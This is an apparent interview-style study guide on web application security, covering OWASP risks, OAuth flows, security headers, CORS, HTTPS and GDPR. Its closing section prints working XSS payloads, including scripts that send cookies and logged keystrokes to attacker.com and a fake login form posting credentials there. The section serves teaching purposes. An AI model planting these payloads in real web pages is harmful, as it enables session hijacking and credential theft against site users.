### What does security mean in software development and why it’s important?
Security refers to the measures and practices taken to protect software systems, applications, and data from unauthorized access, use, disclosure, disruption, modification, or destruction.

### Why security is non-functional requirement?
Security is considered a non-functional requirement in software development because it focuses on the behavior and characteristics of the system rather than its specific functionality.

### How security can be measured in the application?
1. Vulnerability Assessments and Penetration Testing: it helps to identify potential weaknesses and vulnerabilities that could be exploited by attackers.
2. Security Code Reviews: analyzing the application's source code to identify any security flaws, such as insecure coding practices, input validation vulnerabilities, or potential backdoors.
3. Security Metrics: Define and track security metrics to measure and identify areas of improvement. For example, tracking the number of security incidents, response time to incidents, or the percentage of vulnerabilities addressed can provide insights into the overall security state of the application.
4. Compliance with Security Standards and Regulations: Assess the application's compliance with relevant security standards and regulations, such as the Payment Card Industry Data Security Standard (PCI DSS) or General Data Protection Regulation (GDPR). Compliance with these standards demonstrates a certain level of security measures implemented in the application.
5. Security Audits: Conduct periodic security audits to assess the overall security posture of the application. Audits involve a comprehensive review of security controls, policies, and procedures to identify gaps and recommend improvements.
6. Static analyzers: Using BlackDuck, SonarQube in pipelines, etc.

### What tools can be used to improve security in the application?
1. Static code analyzers: Using BlackDuck, SonarQube, Eslint in pipelines, etc.
2. Web Application Firewalls (WAF): WAFs are security appliances or services that monitor and filter HTTP/HTTPS traffic to identify and block common web application attacks such as SQL injection, cross-site scripting (XSS), cross-site request forgery (CSRF), and more. They analyze incoming traffic and filter out malicious requests.
3. Security scanners: it's important to scan and identify vulnerabilities in open source libraries and software dependencies used in software projects. Snyk can analyze the versions of the dependencies and compares them against a comprehensive vulnerability database to detect any known security issues. It provides developers with detailed reports on the vulnerabilities found and offers guidance on how to remediate them.
4. Npm audit: npm audit is a command-line tool that scans a project's dependencies for vulnerabilities and generates a report of the findings. It can be used to identify and fix known vulnerabilities in the application's dependencies.
5. DependaBot: DependaBot is a GitHub app that automatically checks for outdated dependencies in a project and creates pull requests to update them to the latest versions. It can be configured to check for security updates only and create pull requests for them.

### What is the difference between authentication and authorization?
* Authentication verifies the identity of a user or entity.
* Authorization determines permissions granted to authenticated users.

### What is OWASP top 10?
The OWASP Top 10 is a list of the 10 most critical web application security risks identified by the Open Web Application Security Project (OWASP). It is a great starting point for developers to understand the most common security vulnerabilities and how to prevent them.

1. Broken Access Control: Access control enforces policy such that users cannot act outside their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits.

2. Insufficient Logging and Monitoring: Insufficient logging and monitoring vulnerabilities occur when an application does not log or monitor important security events. This makes it difficult to detect and respond to security incidents.

3. Injection: Injection vulnerabilities occur when untrusted data is sent to an interpreter as part of a command or query. This allows an attacker to execute malicious commands or access sensitive data. For example, SQL injection vulnerabilities allow attackers to execute arbitrary SQL commands on the database.

4. Vulnerable and Outdated Components: Vulnerabilities in third-party libraries and components are common in software projects. Attackers can exploit these vulnerabilities to gain access to sensitive data or take control of the application.

5. Cryptographic Failures: It refers to vulnerabilities or weaknesses in the cryptographic mechanisms used to secure data and communications. For example, use of outdated or weak cryptographic algorithms or insecure protocols such as HTTP, or insufficiently strong encryption keys and so on.

### How would you implement authentication in the application?
1. User Registration: Provide a user registration form where users can create an account by providing their credentials, such as username, email, and password. Store the user information securely in a database.
2. User Login: Create a login form where users can enter their credentials to authenticate themselves. Verify the entered credentials against the stored user information in the database. If the credentials are valid, grant access to the user.
3. Session Management: Upon successful login, create a session for the user to maintain their authentication state. This can be done by generating a unique session identifier or token, which is associated with the user's session. Store this identifier securely, such as in a cookie or session storage.
4. Authentication Middleware: Implement authentication middleware to protect the application's resources. This middleware should check for the presence and validity of the session identifier or token for each incoming request. If the session is invalid or expired, deny access and redirect the user to the login page.
5. Password Security: Implement secure password storage by using techniques such as salted hashing or strong encryption. Avoid storing passwords in plain text to prevent unauthorized access in case of a data breach.
6. Password Reset: Provide a mechanism for users to reset their passwords if they forget them. This can involve sending a password reset link to the user's registered email address or using security questions to verify the user's identity.
7. Additional Security Measures: Consider implementing additional security measures like multi-factor authentication (MFA), where users need to provide an additional verification method, such as a code sent to their mobile device, to authenticate themselves.
8. Regular Security Updates: Keep the authentication system up to date by applying security patches and updates to frameworks, libraries, and dependencies used in the application. This helps protect against known vulnerabilities and exploits.
9. Continuous Monitoring and Updates: Regularly review and update your authentication implementation to address any discovered vulnerabilities or weaknesses. Stay informed about the latest security best practices and patches for the frameworks and libraries you use.

### What is OAuth2?
OAuth 2.0 (Open Authorization 2.0) is an open standard protocol that enables secure authorization and delegation of access rights for applications and services. It provides a framework for users to grant access to their resources on one website or application to another website or application without sharing their credentials (such as username and password) directly.

### What OAuth flows do you know?
1. Authorization Code Flow (Web Application Flow): This is the most commonly used flow for web applications. It involves the following steps:
* The client redirects the user to the authorization server, where they authenticate.
* Upon successful authentication, the authorization server provides an authorization code to the client.
* The client exchanges the authorization code for an access token by making a request to the authorization server.
* The authorization server responds with an access token, which the client can use to access protected resources on behalf of the user.

2. Implicit Flow (Client-Side Flow): This flow is designed for public clients such as JavaScript-based applications running in the user's browser. It skips the step of exchanging an authorization code for an access token and directly issues the access token to the client.
* The client redirects the user to the authorization server, where they authenticate.
* Upon successful authentication, the authorization server provides an access token directly to the client.
* The client can then use the access token to access protected resources.

3. Resource Owner Password Credentials Flow: This flow allows the client to directly obtain an access token by presenting the user's credentials (username and password) to the authorization server. It is typically used in trusted environments where the client is owned by the resource owner (user) and can securely handle the user's credentials.
 
4. Client Credentials Flow: This flow is used by confidential clients, such as servers or backend services, to obtain an access token based on their own credentials (client ID and client secret) without involving a user. It is commonly used for server-to-server communication or when the client needs to access its own resources.

5. Authorization Code Flow with PKCE (Proof Key for Code Exchange): This flow is an enhanced version of the authorization code flow designed for mobile and native applications. It provides an additional layer of security to protect against authorization code interception attacks.

These are some of the commonly used OAuth 2.0 flows. The selection of a particular flow depends on factors such as the type of client, the application architecture, security requirements, and the level of trust between the client and the authorization server.

### What the main HTTPS headers exist?
There are several important HTTP headers related to security and other aspects of the communication between a client and a server over HTTPS (HTTP Secure). Here are some of the main HTTPS headers:

1. Strict-Transport-Security (HSTS): This header informs the browser that the website should only be accessed over a secure connection (HTTPS) and helps prevent downgrade attacks.
2. Content-Security-Policy (CSP): This header allows a website to define the trusted sources of content, such as scripts, stylesheets, and images, reducing the risk of cross-site scripting (XSS) and other code injection attacks.
3. X-Content-Type-Options: This header prevents browsers from automatically interpreting the response content type, reducing the risk of MIME type sniffing attacks.
4. X-Frame-Options: This header controls whether a web page can be loaded within an iframe, protecting against clickjacking attacks.
5. X-XSS-Protection: This header enables the browser's built-in cross-site scripting (XSS) protection mechanisms to prevent certain types of XSS attacks.
6. Referrer-Policy: This header specifies how much referrer information should be included when making requests from one website to another, helping to protect user privacy.
7. Content-Encoding: This header indicates the compression algorithm used to compress the response body, such as gzip or deflate.
8. Cache-Control: This header specifies caching directives to control how browsers and other intermediate caches store and handle the response.
9. Authorization: This header contains credentials, such as tokens or basic authentication information, allowing the client to authenticate with the server.
10. User-Agent: This header identifies the client's software, such as the web browser or user agent, which can be useful for server-side processing or conditional logic.

### How does Cross-Origin Resource Sharing work?
CORS stands for Cross-Origin Resource Sharing. It is a mechanism that allows web browsers to make cross-origin requests, i.e., requests from one domain to another domain. CORS headers are used to control and regulate cross-origin requests and ensure secure communication between different origins (domains).

When a web browser makes a cross-origin request, it sends an HTTP request with an Origin header that specifies the domain from which the request originates. The server, in response, includes CORS headers in its HTTP response to indicate whether the request is allowed and what permissions are granted.

The main CORS headers are as follows:
* Access-Control-Allow-Origin: This header specifies which domains are allowed to access the resources on the server. It can be set to a specific domain, "*", or a list of allowed domains.
* Access-Control-Allow-Methods: This header specifies the HTTP methods (e.g., GET, POST, PUT, DELETE) allowed for the cross-origin request.
* Access-Control-Allow-Headers: This header lists the allowed headers for the cross-origin request. It specifies which additional headers besides the standard headers (e.g., Content-Type, Authorization) are allowed in the request.
* Access-Control-Allow-Credentials: This header indicates whether the request can include credentials, such as cookies or HTTP authentication, when making a cross-origin request. It must be explicitly set to "true" for the request to include credentials.
* Access-Control-Expose-Headers: This header lists the custom headers that can be exposed to the client in the response. It allows the server to specify additional headers that the client can access.

When a browser receives a response with CORS headers, it performs security checks based on those headers. If the response headers allow the cross-origin request, the browser allows the response to be accessed by the client JavaScript code. Otherwise, the browser blocks the response, and the JavaScript code running in the client cannot access the response data.

CORS headers provide a way to control and secure cross-origin requests, preventing unauthorized access to resources and protecting sensitive data. They are enforced by web browsers to ensure the security of client-side web applications.

### How does HTTPS protocol work?
HTTPS (Hypertext Transfer Protocol Secure) is a protocol used for secure communication over the internet. It is an extension of HTTP that adds encryption and authentication mechanisms to protect data transmitted between a client (such as a web browser) and a server.

Here's a simplified overview of how the HTTPS protocol works:

1. Handshake: The client initiates a secure connection by sending a request to the server using the HTTPS URL (e.g., https://www.example.com). The server responds with its digital certificate, which includes the server's public key and other information.
2. Certificate Verification: The client verifies the authenticity of the server's certificate. It checks if the certificate is issued by a trusted certificate authority (CA), has not expired, and matches the domain name of the server.
3. Key Exchange: If the certificate is deemed valid, the client generates a random symmetric encryption key called the session key. The client encrypts this session key using the server's public key obtained from the certificate and sends it back to the server.
4. Encryption: Both the client and server now have the same session key, which they will use for symmetric encryption and decryption of the data transmitted during the HTTPS session. This ensures that the data exchanged between the client and server remains confidential and cannot be easily intercepted or understood by unauthorized parties.
5. Secure Communication: With the session key in place, the client and server can now securely exchange data over the encrypted connection. The client can send HTTP requests, and the server responds with encrypted HTTP responses. The data is encrypted before being sent and decrypted upon receipt using the shared session key.
6. End of Session: Once the client and server complete their communication or the session times out, the connection is closed. The session key is discarded, and a new key is generated for subsequent sessions.

### What is the man-in-the-middle attack?
A man-in-the-middle (MITM) attack is a type of cyber attack where an attacker intercepts and potentially alters the communication between two parties who believe they are directly communicating with each other. In this attack, the attacker secretly relays and possibly modifies the data exchanged between the two parties, without their knowledge.

Here's a simplified scenario of how a man-in-the-middle attack can occur:
1. Initial Communication: Alice wants to communicate securely with Bob. They both have their own encryption keys. However, an attacker, Eve, positions herself between Alice and Bob.
2. Interception: When Alice initiates a connection to Bob, Eve intercepts the communication. Alice believes she is directly communicating with Bob, but in reality, all her messages pass through Eve.
3. Spoofing: Eve can impersonate Alice to Bob and Bob to Alice by establishing separate encrypted connections with both of them. This allows her to intercept and read the messages sent between them.
4. Data Manipulation: Eve can modify the intercepted messages before forwarding them to the intended recipient. This manipulation can involve altering the content of the messages, injecting malicious code or malware, or redirecting the communication to a different destination.
5. Capture and Analysis: Eve can capture sensitive information exchanged between Alice and Bob, such as login credentials, financial data, or personal information. She can use this information for malicious purposes or sell it to other attackers.

To mitigate the risk of man-in-the-middle attacks, several security measures can be employed, including the use of strong encryption protocols (such as HTTPS), digital certificates for server authentication, public key infrastructure (PKI), secure network configurations, and user awareness about potential risks and secure communication practices.

### What is SSO?
SSO stands for Single Sign-On. It is an authentication mechanism that allows users to access multiple applications or systems with a single set of login credentials. With SSO, users only need to authenticate once, typically using their username and password, and they gain access to multiple applications without the need to provide credentials again for each application.

### What does stateful and stateless authentication mean?
Stateful Authentication:
Stateful authentication relies on the server to maintain the session state for each authenticated user. When a user logs in, the server generates a session identifier or token and associates it with the user's session data stored on the server. The session identifier is typically sent back to the client (e.g., as a cookie) and included in subsequent requests to identify the user's session.
With stateful authentication, the server keeps track of the user's authentication status and session data throughout the session. This often involves storing session information on the server or in a centralized session store. The server needs to validate the session identifier with each request to ensure the user is authenticated and authorized to access the requested resources.

Stateless Authentication:
Stateless authentication, on the other hand, does not rely on the server to maintain session state. Instead, each request contains all the necessary information to authenticate the user. The server validates the request independently without referencing any stored session information.
In stateless authentication, the client typically includes authentication credentials, such as a token or JWT, in each request's headers or as query parameters. The server validates the credentials by checking their integrity and authenticity, often using cryptographic techniques, without the need to consult any stored session data.
Stateless authentication is advantageous in distributed systems, microservices architectures, and scalability scenarios as it eliminates the need for the server to store session data or maintain session affinity. It simplifies the server's job, reduces storage requirements, and allows for better horizontal scaling.

### How to use iframes securely?
To use iframes securely, consider the following recommendations:

1. Use the sandbox attribute: Add the sandbox attribute to the iframe tag and specify the desired restrictions. This attribute helps prevent the execution of potentially malicious scripts and restricts access to certain features of the iframe.
2. Validate the source: Ensure that the source of the iframe is trustworthy and originates from a reliable and secure domain. Verify that the source URL uses HTTPS to establish a secure connection.
3. Set the X-Frame-Options header: The X-Frame-Options header allows you to control whether your website can be embedded within an iframe on another domain. By setting this header to DENY or SAMEORIGIN, you can prevent clickjacking attacks where an attacker tricks users into interacting with your site through a maliciously crafted iframe.
4. Implement Content Security Policy (CSP): Utilize Content Security Policy to define a policy that restricts the types of content that can be loaded on your website. With CSP, you can specify which domains are allowed to load your site within an iframe using the frame-ancestors directive.
5. Use the referrer attribute: Include the referrer attribute on the iframe tag to control the information that is sent as the Referer header when the user navigates from the iframe to another page. Set it to "no-referrer" or "origin" to limit the information disclosed.
6. Avoid passing sensitive data: Refrain from passing sensitive information between the parent page and the iframe. If necessary, implement secure communication channels like HTTPS and utilize encryption techniques.
7. Regularly update and patch: Keep the underlying software and libraries used in your application, including the iframe content, up to date with the latest security patches and updates.

### How options request works?
The OPTIONS request works as part of the Cross-Origin Resource Sharing (CORS) mechanism to determine the permissions for cross-origin requests. Here is a general overview of how the OPTIONS request works:

* Origin Check: When a browser makes a cross-origin request (i.e., a request to a different domain, port, or protocol), it first sends an OPTIONS request to the server to check the permissions.
* Preflight Request: The OPTIONS request is considered a "preflight" request because it is sent before the actual request to determine if the actual request is safe to send. It acts as a preliminary check to ensure that the cross-origin request will not cause any unexpected side effects.
* Request Headers: The OPTIONS request includes certain headers to convey information about the actual request that will follow. These headers include the HTTP method, headers, and other relevant metadata.
* Server Response: The server responds to the OPTIONS request with appropriate headers that indicate which origins, methods, and headers are allowed for the requested resource. These headers include:
    1. Access-Control-Allow-Origin: Specifies which origins are allowed to make cross-origin requests to the server.
    2. Access-Control-Allow-Methods: Indicates the HTTP methods that are allowed for the actual request.
    3. Access-Control-Allow-Headers: Specifies the headers that are allowed to be included in the actual request.
    4. Access-Control-Max-Age: Optionally, the server can specify how long the preflight response can be cached by the browser.
* Browser Evaluation: Upon receiving the response to the OPTIONS request, the browser evaluates the headers to determine if the actual cross-origin request should proceed or not. It checks if the origin is allowed, if the requested method and headers are permitted, and if any additional security constraints are met.
* Actual Request: If the browser determines that the actual request is allowed based on the OPTIONS response, it proceeds to send the actual request (e.g., GET, POST, PUT, etc.) along with the necessary headers and data.

By using the OPTIONS request, the server can define its access control policies and communicate them to the browser, allowing for safe and controlled cross-origin communication while protecting against unauthorized or malicious requests.

### What is PII data?
PII stands for Personally Identifiable Information. It refers to any information that can be used to identify, locate, or contact an individual. PII data includes both sensitive and non-sensitive information that, when combined, can potentially identify a specific person. Examples of PII data include:

* Name: Full name, maiden name, aliases, or initials.
* Contact Information: Phone numbers, email addresses, physical addresses, or social media usernames.
* Identification Numbers: Social Security numbers, passport numbers, driver's license numbers, or national identification numbers.
* Financial Information: Bank account numbers, credit card numbers, or financial transaction history.
* Personal Characteristics: Date of birth, age, gender, race, or marital status.
* Biometric Data: Fingerprints, voiceprints, retina scans, or facial recognition data.
* Medical Information: Health records, medical history, or insurance information.
* Educational Information: School records, academic performance, or educational history.
* Employment Information: Job history, employee ID numbers, or salary details.
* Online Identifiers: IP addresses, usernames, or device identifiers.
* Protecting PII data is crucial to maintaining privacy and preventing identity theft, fraud, or unauthorized access to personal information. Organizations handling PII data are often required to implement security measures, such as encryption, access controls, and data breach notification protocols, to safeguard this sensitive information.

### What is GDPR?
In simple terms, GDPR is a set of rules that organizations must follow when collecting, storing, and processing personal data of individuals residing in the EU. Personal data includes any information that can be used to identify a person, such as their name, address, email, or even their IP address.

### Provide examples of XSS attacks
Alert Box: An attacker injects a script that triggers an alert box, displaying a message to the victim user. For example:
<script>alert('XSS Attack');</script>

Cookie Theft: An attacker can steal a user's session cookie, allowing them to impersonate the user and gain unauthorized access. For example:
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>

Defacement: An attacker alters the appearance or content of a website to deface it or spread a malicious message. For example:
<script>document.body.innerHTML = '<h1>Website Hacked!</h1>';</script>

Keylogging: An attacker captures keystrokes entered by the victim user, potentially capturing sensitive information like usernames, passwords, or credit card details. For example:
<script>document.onkeydown = function(e) { var key = String.fromCharCode(e.keyCode); new Image().src = 'http://attacker.com/collect.php?k=' + key; }</script>

Phishing: An attacker creates a convincing replica of a legitimate website and tricks users into entering their credentials, which are then captured by the attacker. For example:
<form action="http://attacker.com/steal.php" method="POST">
  <input type="text" name="username" placeholder="Username"><br>
  <input type="password" name="password" placeholder="Password"><br>
  <input type="submit" value="Login">
</form>

These examples highlight the potential impact of XSS attacks and the need for proper input validation, output encoding, and other security measures to prevent such vulnerabilities in web applications. It's important to stay vigilant and employ security best practices to mitigate the risk of XSS attacks.
